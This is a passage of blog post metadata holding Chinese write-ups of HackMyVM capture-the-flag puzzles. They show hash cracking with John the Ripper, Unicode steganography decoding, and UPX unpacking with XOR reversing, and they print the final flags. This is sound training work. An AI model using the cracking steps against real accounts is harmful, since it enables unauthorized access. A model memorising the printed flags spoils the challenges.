`Raw-SHA512`\u3002\n    ```bash\n    john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512\n    ```\n\n3.  **\u7834\u89e3\u7ed3\u679c**: John \u6210\u529f\u627e\u5230\u4e86\u5bf9\u5e94\u7684\u660e\u6587\u3002\n    ```\n    i like your smile (?)\n    ```\n    \u7834\u89e3\u51fa\u7684\u5bc6\u7801\u662f `i like your smile`\u3002\n\n## **\u7b2c\u56db\u6b65\uff1a\u6784\u9020 Flag**\n\n\u6839\u636e\u9898\u76ee\u8981\u6c42\uff0cFlag \u7684\u683c\u5f0f\u4e3a `HMV{...}`\uff0c\u5e76\u4e14\u5185\u5bb9\u4e0d\u5305\u542b\u7a7a\u683c\u3002\n\n1.  \u79fb\u9664\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u4e2d\u7684\u7a7a\u683c: `i like your smile` -> `ilikeyoursmile`\n2.  \u5c06\u7ed3\u679c\u586b\u5165\u82b1\u62ec\u53f7\u4e2d\u3002\n\n---\n\n# **\u6700\u7ec8 Flag**\n\n```\nHMV{ilikeyoursmile}\n```sentence", "top": 0, "createdAt": 1753173169, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P155": {"htmlDir": "docs/post/Challenge 068.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 068", "postUrl": "post/Challenge%20068.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/155", "commentNum": 0, "wordCount": 1836, "description": "![image-20250722102128231](https://7r1UMPHK.github.io/image/static/image/20250722103206029.webp)\n# **\u89e3\u9898\u6b65\u9aa4**\n\n## **\u7b2c\u4e00\u6b65\uff1a\u6587\u4ef6\u5206\u6790\u4e0e\u5f02\u5e38\u53d1\u73b0**\n\n1.  **\u89e3\u538b\u6587\u4ef6**: \u6311\u6218\u59cb\u4e8e\u4e00\u4e2a `068.zip` \u538b\u7f29\u5305\uff0c\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u6587\u672c\u6587\u4ef6 `068.txt`\u3002\n\n2.  **\u67e5\u770b\u5185\u5bb9**: \u521d\u6b65\u4f7f\u7528 `cat` \u547d\u4ee4\u67e5\u770b\u6587\u4ef6\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u5230\u4e00\u884c\u88ab\u5c0f\u9e1f\u56fe\u6807\u5305\u56f4\u7684\u6587\u672c\uff1a\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n    \u2514\u2500$ cat 068.txt   \n    \ud83d\udc26I\uff54's\u2000\uff4e\uff4ft\u200athat\u202f\uff45as\uff59,\u2000t\uff41le\u2004a\u2009dee\uff50\u2001b\uff52\uff45\uff41th\u2002\uff41n\uff44\u2002\uff52e\uff4c\uff41x.\u2002C\uff48i\uff52p,\u2006\u03f2h\u2170r\uff50\uff0c\u2005ch\uff49\uff52\uff50.\u0399t\uff07s\u2000n\u03bft\u2004th\uff41\uff54\u2009\uff45\uff41sy,\u2000ta\uff4ce\u2004a\u2004d\uff45e\uff50 \uff42reath\u2004a\uff4ed\u2003relax. Chirp, chirp, chirp.\ud83d\udc26\n    ```\n    \u4e4d\u4e00\u770b\uff0c\u8fd9\u4f3c\u4e4e\u53ea\u662f\u4e00\u53e5\u666e\u901a\u7684\u53e5\u5b50\u3002\u7136\u800c\uff0c\u5982\u679c\u4f7f\u7528\u5e26\u6709 `-A` \u53c2\u6570\u7684 `cat` \u547d\u4ee4\u6765\u663e\u793a\u6240\u6709\u975e\u6253\u5370\u5b57\u7b26\uff0c\u5c31\u4f1a\u53d1\u73b0\u4e8b\u60c5\u5e76\u4e0d\u7b80\u5355\uff1a\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n    \u2514\u2500$ cat -A 068.txt\n    M-pM-^_M-^PM-&I...\n    ```\n    \n    \u5927\u91cf\u7684 `M-^` \u7b26\u53f7\u8868\u660e\uff0c\u8fd9\u4e9b\u5b57\u7b26\u5e76\u975e\u6807\u51c6\u7684 ASCII \u5b57\u7b26\u3002\u4ed4\u7ec6\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff1a\n    \n    *   **\u5bbd\u4f53\u5b57\u7b26**: \u51e0\u4e4e\u6240\u6709\u7684\u5b57\u6bcd\u90fd\u662f\u5168\u89d2\uff08Full-width\uff09\u5f62\u5f0f\uff0c\u4f8b\u5982 `\uff29` \u800c\u4e0d\u662f `I`\u3002\n    *   **\u4e0d\u89c4\u5219\u7a7a\u683c**: \u5355\u8bcd\u4e4b\u95f4\u7684\u7a7a\u683c\u5bbd\u5ea6\u4e0d\u4e00\uff0c\u5b83\u4eec\u662f Unicode \u4e2d\u5b9a\u4e49\u7684\u591a\u79cd\u4e0d\u540c\u5bbd\u5ea6\u7684\u7a7a\u683c\u5b57\u7b26\u3002\n    *   **\u540c\u5f62\u5f02\u4e49\u5b57 (Homoglyphs)**: \u6587\u672c\u4e2d\u53ef\u80fd\u6df7\u5165\u4e86\u5176\u4ed6\u770b\u8d77\u6765\u4e0e\u6807\u51c6\u5b57\u6bcd\u4e00\u6837\u7684 Unicode \u5b57\u7b26\uff0c\u4f8b\u5982\u5e0c\u814a\u5b57\u6bcd `\u03bf` (omicron) \u4ee3\u66ff\u4e86\u62c9\u4e01\u5b57\u6bcd `o`\u3002\n    \n    \u8fd9\u4e9b\u8ff9\u8c61\u660e\u786e\u5730\u6307\u5411\u4e86\u4e00\u79cd\u9ad8\u7ea7\u7684\u6587\u672c\u9690\u5199\u672f\u3002\n\n## **\u7b2c\u4e8c\u6b65\uff1a\u7406\u89e3 Unicode \u9690\u5199\u672f\u539f\u7406**\n\n\u8fd9\u79cd\u9690\u5199\u672f\u7684\u539f\u7406\u662f\u5c06\u4fe1\u606f\u7f16\u7801\u5230\u5b57\u7b26\u7684\u9009\u62e9\u4e2d\u3002\n\n1.  **\u5b57\u7b26\u96c6**: \u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u6807\u51c6 ASCII \u5b57\u7b26\uff08\u5982 `a`, `b`, ` ` \u7b49\uff09\uff0c\u90fd\u5b58\u5728\u4e00\u4e2a\u5305\u542b\u5b83\u81ea\u8eab\u7684\u3001\u4ee5\u53ca\u591a\u4e2a\u89c6\u89c9\u4e0a\u6781\u4e3a\u76f8\u4f3c\u7684 Unicode \u53d8\u4f53\u5b57\u7b26\u7684\u5217\u8868\u3002\n2.  **\u7f16\u7801**: \u79d8\u5bc6\u4fe1\u606f\u9996\u5148\u88ab\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u7801\u6d41\uff08\u5982 `011010...`\uff09\u3002\n3.  **\u5d4c\u5165**: \u7a0b\u5e8f\u5728\u751f\u6210\u8f7d\u4f53\u6587\u672c\u65f6\uff0c\u4f1a\u6839\u636e\u8981\u9690\u85cf\u7684\u4e8c\u8fdb\u5236\u4f4d\u6765\u4ece\u5907\u9009\u5217\u8868\u4e2d\u9009\u62e9\u5177\u4f53\u7684\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u5982\u679c `t` \u6709 4 \u4e2a\u53d8\u4f53 `t`, `\uff54`, `\u1d1b`, `\ud835\udd31`\uff0c\u5b83\u4eec\u53ef\u4ee5\u5206\u522b\u7528\u6765\u8868\u793a 2-bit \u7684\u4e8c\u8fdb\u5236\u6570 `00`, `01`, `10`, `11`\u3002\u5f53\u7a0b\u5e8f\u9700\u8981\u9690\u85cf `01` \u65f6\uff0c\u5b83\u5c31\u4f1a\u5728\u6587\u672c\u4e2d\u5199\u5165 `\uff54`\u3002\n4.  **\u9690\u85cf**: \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6574\u6bb5\u79d8\u5bc6\u4fe1\u606f\u88ab\u5206\u89e3\u6210\u65e0\u6570\u4e2a\u5c0f\u7247\u6bb5\uff0c\u5e76\u201c\u6eb6\u89e3\u201d\u5728\u6574\u4e2a\u6587\u672c\u7684\u5b57\u7b26\u548c\u7a7a\u683c\u7684\u9009\u62e9\u4e4b\u4e2d\uff0c\u4f7f\u5176\u65e0\u6cd5\u88ab\u76f4\u63a5\u9605\u8bfb\u3002\n\n## **\u7b2c\u4e09\u6b65\uff1a\u4f7f\u7528\u4e13\u4e1a\u5de5\u5177\u89e3\u7801**\n\n\u624b\u52a8\u89e3\u7801\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u4e00\u4e2a\u5e9e\u5927\u7684 Unicode \u53d8\u4f53\u5b57\u7b26\u6570\u636e\u5e93\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e13\u95e8\u7684\u89e3\u7801\u5de5\u5177\u3002\n\n1.  **\u5728\u7ebf\u5de5\u5177**: [Holloway's Steganography Tool](https://holloway.nz/steg/) \u662f\u4e00\u4e2a\u80fd\u591f\u5904\u7406\u6b64\u7c7b Unicode \u9690\u5199\u672f\u7684\u5728\u7ebf\u89e3\u7801\u5668\u3002\n\n2.  **\u89e3\u7801\u64cd\u4f5c**: \u5c06 `068.txt` \u4e2d\u7684\u5b8c\u6574\u5185\u5bb9\uff08\u5305\u62ec\u524d\u540e\u7684 `\ud83d\udc26` \u56fe\u6807\uff09\u590d\u5236\u5e76\u7c98\u8d34\u5230\u8be5\u7f51\u7ad9\u7684\u8f93\u5165\u6846\u4e2d\u3002\n\n3.  **\u83b7\u53d6\u7ed3\u679c**: \u8be5\u5de5\u5177\u4f1a\u81ea\u52a8\u5206\u6790\u6587\u672c\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u7684 Unicode \u7f16\u7801\uff0c\u8bc6\u522b\u51fa\u5176\u5728\u53d8\u4f53\u5217\u8868\u4e2d\u7684\u7d22\u5f15\uff0c\u4ece\u800c\u63d0\u53d6\u51fa\u9690\u85cf\u7684\u4e8c\u8fdb\u5236\u4f4d\uff0c\u5e76\u6700\u7ec8\u5c06\u5176\u8fd8\u539f\u4e3a\u539f\u59cb\u4fe1\u606f\u3002\n\n    \u89e3\u7801\u540e\u5f97\u5230\u7684\u9690\u85cf\u6587\u672c\u4e3a\uff1a\n    ```\n    hmvgreetings_from_green_br0ther\n    ```\n\n---\n\n# **\u6700\u7ec8 Flag**\n\n```\nhmvgreetings_from_green_br0ther\n```sentence", "top": 0, "createdAt": 1753173183, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P156": {"htmlDir": "docs/post/Challenge 069.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 069", "postUrl": "post/Challenge%20069.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/156", "commentNum": 0, "wordCount": 1912, "description": "![image-20250722210655654](https://7r1umphk.github.io/image/20250722210710989.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 069.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 198 bytes (1 KiB)\n\nExtracting archive: 069.zip\n--\nPath = 069.zip\nType = zip\nPhysical Size = 198\n\nEverything is Ok\n\nSize:       4\nCompressed: 198\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 21\ndrwxr-xr-x 1 kali kali  4096  7\u670822\u65e5 09:07 .\ndrwxr-xr-x 1 kali kali 16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali     4 2024\u5e74 4\u670819\u65e5 069.bin\n-rwxr-xr-x 1 kali kali   198  7\u670822\u65e5 09:07 069.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ find 069.bin                                             \n069.bin\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ strings 069.bin                           \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 069.bin\n\ufffd                                                                                               \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ xxd 069.bin\n00000000: 8d08 13b0                                ....\n```\n\n\u6211\u53bb\uff0c\u8fd9\u4e48\u5c11\u4e1c\u897f\n\n```\n8d0813b0\nHM@....@\nHM@HACK@\n```\n\nsentence", "top": 0, "createdAt": 1753197004, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P157": {"htmlDir": "docs/post/Challenge 070.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 070", "postUrl": "post/Challenge%20070.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/157", "commentNum": 0, "wordCount": 5150, "description": "![image-20250722212408911](https://7r1umphk.github.io/image/20250722212409115.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 070.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 308448 bytes (302 KiB)\n\nExtracting archive: 070.zip\n--\nPath = 070.zip\nType = zip\nPhysical Size = 308448\n\nEverything is Ok\n\nFiles: 2\nSize:       316108\nCompressed: 308448\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 631\ndrwxr-xr-x 1 kali kali   4096  7\u670822\u65e5 09:39 .\ndrwxr-xr-x 1 kali kali  16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali 308448  7\u670822\u65e5 09:39 070.zip\n-rwxr-xr-x 1 kali kali   6600 2024\u5e74 3\u670814\u65e5 hmv005\n-rwxr-xr-x 1 kali kali 309508 2024\u5e74 3\u670814\u65e5 hmv005-static\n                                     \n```\n\n\u5c1d\u8bd5\u53cd\u7f16\u8bd1\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ strings hmv005                            \nUPX!\ntdoP7\n[oQ7\n/lib64\nnux-x86-\nso.2\nputs\nfree\nstrlen\nmall\nart_\ncxa_f    iz.\n6sLIBC_2.34\n5/ITM_deZgiE\nCWneTabeK`\n]_*(\nPTE1\nu+UH\n_GLOBAL_OFFSET_TABLE_\nframe_\ndummy\n Lost in OSINT \n$/PP\n;*3$'?}\nUSQRH\nW^YH\nPROT_EXEC|PROT_WRITE failed.\n_j<X\n$Info: This file is packed with the UPX executable packer http://upx.sf.net $\n$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $\n_RPWQM)\nj'AZR^j\nPZS^\n/proc/self/exe\nIuDSWH\ns2V^\nXAVAWPH\nYT_j\nAY^_\nD$ [I\nUPX!u\nslIT$}\n}aw993u\n([]A\\A]\nI[8k\n(L      '\ntL      n\n+xHf\np(E1[$1\nfFj9\n~*'|]\nI5(Ag\n@bQs\n k1(\n=(I[u\nA^A_)\nm@S r6\nck5?\nJAPC\nJG=,1\nSRVW\nRY?WVj,4\nGCC: (Debian 13.2.0-\n/|G`\n x!va\n0G]/\naw7L\nScrt1.o\n_tag\nstuff.c\nderegi\n_clones)do_g\nbal     tor\ns9ux5omple)d.0!\n_fin`array_entry\nvme ummy2\n)t*hmv005\n'Fwyk\nRAME_END\nDYNIC\nvGNU\nGLOBA\nL_OFFSET_TABL\nsee@\nBC_2\n59libc_\nnrmay\nITM_\nT)Xroo\nse1chH\ndF_uod\ncj(3bssNc\n~KeySav\nimP_\noize5\n6.symnb\nh        Np\no.gnu.prop\nbuild-id\nK       dynb\nla(so#\n.ehthd\nQd5G3\n=,?8\n'epa\n.P/^\n 0o9l\nUPX!\nUPX!\n```\n\n\u8f93\u51fa\u4e2d\u591a\u6b21\u51fa\u73b0\u4e86 UPX! \u4ee5\u53ca $Info: This file is packed with the UPX executable packer http://upx.sf.net $ \u7684\u5b57\u6837\u3002\u8fd9\u660e\u786e\u8868\u793a hmv005 \u6587\u4ef6\u4f7f\u7528\u4e86 UPX \u52a0\u58f3\u5de5\u5177\u8fdb\u884c\u4e86\u538b\u7f29\u548c\u6df7\u6dc6\u3002\n\n\u8131\u58f3\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ upx -d hmv005\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2024\nUPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n     24851 <-      6600   26.56%   linux/amd64   hmv005\n\nUnpacked 1 file.\n                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 640\ndrwxr-xr-x 1 kali kali   4096  7\u670822\u65e5 09:41 .\ndrwxr-xr-x 1 kali kali  16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali 308448  7\u670822\u65e5 09:39 070.zip\n-rwxr-xr-x 1 kali kali  16192 2024\u5e74 3\u670814\u65e5 hmv005\n-rwxr-xr-x 1 kali kali 309508 2024\u5e74 3\u670814\u65e5 hmv005-static\n```\n\n\u53cd\u7f16\u8bd1\u4e00\u4e0b\n\n\u62d6\u5165IDA PRO\n\nF5\n\n```\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  unsigned __int64 v3; // rbx\n  size_t v4; // rax\n  unsigned __int64 v5; // rbx\n  size_t v6; // rax\n  int v8[34]; // [rsp+0h] [rbp-C0h]\n  int v9; // [rsp+88h] [rbp-38h]\n  int v10; // [rsp+8Ch] [rbp-34h]\n  void *ptr; // [rsp+90h] [rbp-30h]\n  char *v12; // [rsp+98h] [rbp-28h]\n  char *s; // [rsp+A0h] [rbp-20h]\n  int v14; // [rsp+A8h] [rbp-18h]\n  int i; // [rsp+ACh] [rbp-14h]\n\n  v8[0] = 113;\n  v8[1] = 120;\n  v8[2] = 123;\n  v8[3] = 89;\n  v8[4] = 116;\n  v8[5] = 118;\n  v8[6] = 73;\n  v8[7] = 78;\n  v8[8] = 22;\n  v8[9] = 92;\n  v8[10] = 122;\n  v8[11] = 77;\n  v8[12] = 82;\n  v8[13] = 106;\n  v8[14] = 101;\n  v8[15] = 84;\n  v8[16] = 65;\n  v8[17] = 74;\n  v8[18] = 86;\n  v8[19] = 94;\n  v8[20] = 87;\n  v8[21] = 121;\n  v8[22] = 110;\n  v8[23] = 109;\n  v8[24] = 103;\n  v8[25] = 97;\n  v8[26] = 112;\n  v8[27] = 76;\n  v8[28] = 89;\n  v8[29] = 79;\n  v8[30] = 95;\n  v8[31] = 86;\n  v14 = 32;\n  s = '_GLOBAL_OFFSET_TABLE_';\n  v12 = 'frame_dummy';\n  dontSearchForKeySaveTime(argc, argv, envp);\n  ptr = malloc(0x21uLL);\n  for ( i = 0; i < v14; ++i )\n  {\n    v3 = i;\n    v4 = strlen(s);\n    v10 = s[v3 % v4];\n    v5 = i;\n    v6 = strlen(v12);\n    v9 = v12[v5 % v6];\n    *((_BYTE *)ptr + i) = v9 ^ v10 ^ LOBYTE(v8[i]);\n  }\n  *((_BYTE *)ptr + v14) = 0;\n  searchHere();\n  free(ptr);\n  puts(::s);\n  return 0;\n}\n```\n\n\u7f16\u4e2apy\n\n```\n# C \u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684\u6570\u636e\nv8 = [\n    113, 120, 123, 89, 116, 118, 73, 78, 22, 92, 122, 77, 82, 106, 101, 84,\n    65, 74, 86, 94, 87, 121, 110, 109, 103, 97, 112, 76, 89, 79, 95, 86\n]\ns = '_GLOBAL_OFFSET_TABLE_'\nv12 = 'frame_dummy'\nv14 = 32 # flag \u957f\u5ea6\n\nflag = []\n\n# \u590d\u73b0 for \u5faa\u73af\u7684\u903b\u8f91\nfor i in range(v14):\n    # \u8ba1\u7b97\u4e24\u4e2a\u5bc6\u94a5\u7684\u5f53\u524d\u5b57\u7b26\n    key_char1 = ord(s[i % len(s)])\n    key_char2 = ord(v12[i % len(v12)])\n    \n    # \u83b7\u53d6 v8 \u6570\u7ec4\u4e2d\u7684\u503c\n    v8_char = v8[i]\n    \n    # \u6267\u884c\u4e09\u6b21\u5f02\u6216\u64cd\u4f5c\n    decrypted_char = key_char1 ^ key_char2 ^ v8_char\n    \n    # \u5c06\u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u6dfb\u52a0\u5230\u5217\u8868\u4e2d\n    flag.append(chr(decrypted_char))\n\n# \u5c06\u5b57\u7b26\u5217\u8868\u5408\u5e76\u6210\u6700\u7ec8\u7684\u5b57\u7b26\u4e32\nfinal_flag = ''.join(flag)\n\nprint(f'\u89e3\u5bc6\u5f97\u5230\u7684 Flag \u662f: {final_flag}')\n```\n\n\u8fd0\u884c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 a.py             \n\u89e3\u5bc6\u5f97\u5230\u7684 Flag \u662f: HMV{Shad4wExe_We_love_OSINT_but}\n```\n\nsentence", "top": 0, "createdAt": 1753197017, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P158": {"htmlDir": "docs/post/Challenge 071.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 071", "postUrl": "post/Challenge%20071.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/158", "commentNum": 0, "wordCount": 8393, "description": "![image-20250722214605319](https://7r1umphk.github.io/image/20250722214605558.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 071.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 3437 bytes (4 KiB)\n\nExtracting archive: 071.zip\n--\nPath = 071.zip\nType = zip\nPhysical Size = 3437\n\nEverything is Ok\n\nSize:       7094\nCompressed: 3437\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al \n\u603b\u8ba1 31\ndrwxr-xr-x 1 kali kali  4096  7\u670822\u65e5 09:46 .\ndrwxr-xr-x 1 kali kali 16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali  3437  7\u670822\u65e5 09:46 071.zip\n-rwxr-xr-x 1 kali kali  7094 2024\u5e74 2\u670815\u65e5 hmv-moje02.txt\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat hmv-moje02.txt \nJalanClmd Ad X fVyVazIXtAxVf AazVIaXzAlaXt XyzAiAdz Xaf oXyUzAiAdz ylttVyzAiV Xaf CliVCVaz TIACXIAtn Ualva glI Azd iXIAlmd ynEVIXzzXyUd XOXAadz dViVIXt OliVIaCVazd, OliVIaCVaz AadzAzmzAlad Xaf OliVIaCVaz XOVayAVd, ylITlIXzAlad Xaf zoV somIyo lg YyAVazltlOn. JalanClmd lIAOAaXzVf Aa 2003 la zoV ACXOVElXIf 4yoXa IVTIVdVazAaO zoV ylayVTz lg CXan latAaV Xaf lggtAaV ylCCmaAzn mdVId dACmtzXaVlmdtn VKAdzAaO Xd Xa 'XaXIyoAy', fAOAzAxVf 'OtlEXt EIXAa' lI 'oAiVCAaf'. JalanClmd CVCEVId (Ualva Xd Xalad) yXa dlCVzACVd EV fAdzAaOmAdoVf Aa TmEtAy En zoV vVXIAaO lg Qmn uXvUVd CXdUd Aa zoV dzntV TlIzIXnVf Aa zoV OIXToAy aliVt Xaf gAtC w glI wVafVzzX. YlCV Xalad Xtdl lTz zl CXdU zoVAI ilAyVd zoIlmOo ilAyV yoXaOVId lI zVKz-zl-dTVVyo TIlOIXCd. BlxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd Aa ylmazIAVd AaytmfAaO zoV eaAzVf YzXzVd, zoV eaAzVf NAaOflC, JmdzIXtAX, zoV kVzoVItXafd, Ylmzo JgIAyX, YTXAa, qafAX, Xaf bmIUVn. PiXtmXzAlad lg zoV OIlmT'd XyzAlad Xaf VggVyzAiVaVdd iXIn vAfVtn. YmTTlIzVId oXiV yXttVf zoV OIlmT 'gIVVflC gAOozVId' Xaf fAOAzXt RlEAa Wllfd, voAtV yIAzAyd oXiV fVdyIAEVf zoVC Xd 'X ynEVI tnayo-ClE' lI 'ynEVI zVIIlIAdzd'. qa 2012, bACV yXttVf JalanClmd laV lg zoV '100 Cldz AagtmVazAXt TVlTtV' Aa zoV vlItf. JalanClmd' CVfAX TIlgAtV fACAaAdoVf En 2018, Emz zoV OIlmT IV-VCVIOVf Aa 2020 zl dmTTlIz zoV QVlIOV utlnf TIlzVdzd Xaf lzoVI yXmdVd. MoAtldlTon boV ToAtldlTon lg JalanClmd lggVId AadAOoz Aazl X tlaO-dzXafAaO TltAzAyXt pmVdzAla zoXz oXd OlaV maXadvVIVf vAzo lgzVa zIXOAy yladVpmVayVd glI dlyAXt CliVCVazd: voXz flVd X aVv glIC lg ylttVyzAiV TltAzAyd tllU tAUV zoXz vAdoVd zl Ol EVnlaf zoV AfVazAzn lg zoV AafAiAfmXt dmESVyz Aa tXzV yXTAzXtAdC? qazVIaXt fAddVaz Ad Xtdl X IVOmtXI gVXzmIV lg zoV OIlmT. J vVEdAzV XddlyAXzVf vAzo zoV OIlmT fVdyIAEVd Az Xd 'Xa qazVIaVz OXzoVIAaO' vAzo 'X iVIn tlldV Xaf fVyVazIXtAxVf ylCCXaf dzImyzmIV zoXz lTVIXzVd la AfVXd IXzoVI zoXa fAIVyzAiVd'. QXEIAVttX sltVCXa vIAzVd lg zoV OIlmT: 'qa dlCV vXnd, Az CXn EV ACTlddAEtV zl OXmOV zoV AazVaz Xaf ClzAiV lg zolmdXafd lg TXIzAyATXazd, CXan lg vol fla'z ViVa ElzoVI zl tVXiV X zIXyV lg zoVAI zolmOozd, ClzAiXzAlad, Xaf IVXyzAlad. JClaO zoldV zoXz fl, lTAaAlad iXIn yladAfVIXEtn.' FIlXftn dTVXUAaO, Jalad lTTldV qazVIaVz yVadlIdoAT Xaf ylazIlt Xaf zoV CXSlIAzn lg zoVAI XyzAlad zXIOVz OliVIaCVazd, lIOXaAxXzAlad, Xaf ylITlIXzAlad zoXz zoVn XyymdV lg yVadlIdoAT. Jalad vVIV VXItn dmTTlIzVId lg zoV OtlEXt GyymTn CliVCVaz Xaf zoV JIXE YTIAaO. YAayV 2008, X gIVpmVaz dmESVyz lg fAdXOIVVCVaz vAzoAa JalanClmd Ad voVzoVI CVCEVId dolmtf glymd la TIXaUAaO Xaf VazVIzXAaCVaz lI ClIV dVIAlmd (Xaf, Aa dlCV yXdVd, TltAzAyXt) XyzAiAdC. ZV [JalanClmd] Smdz oXTTVa zl EV X OIlmT lg TVlTtV la zoV qazVIaVz vol aVVf\u2014Smdz UAaf lg Xa lmztVz zl fl Xd vV vAdo, zoXz vV vlmtfa'z EV XEtV zl fl Aa IVOmtXI dlyAVzn. ...boXz'd ClIV lI tVdd zoV TlAaz lg Az. Bl Xd nlm vAdo. ... boVIV'd X ylCCla ToIXdV: 'vV XIV flAaO Az glI zoV tmtx.' \u2014\u200abIVaz MVXylyU, 'YVXIyo PaOAaV: boV uXyV lg JalanClmd, uVEImXIn 7, 2008. FVyXmdV JalanClmd oXd al tVXfVIdoAT, al XyzAla yXa EV XzzIAEmzVf zl zoV CVCEVIdoAT Xd X voltV. MXICn Gtdla Xaf lzoVId oXiV yIAzAyAxVf CVfAX yliVIXOV zoXz TIVdVazd zoV OIlmT Xd vVtt-lIOXaAxVf lI olClOVaVlmd; Gtdla vIAzVd, 'boVIV vXd al dAaOtV tVXfVI 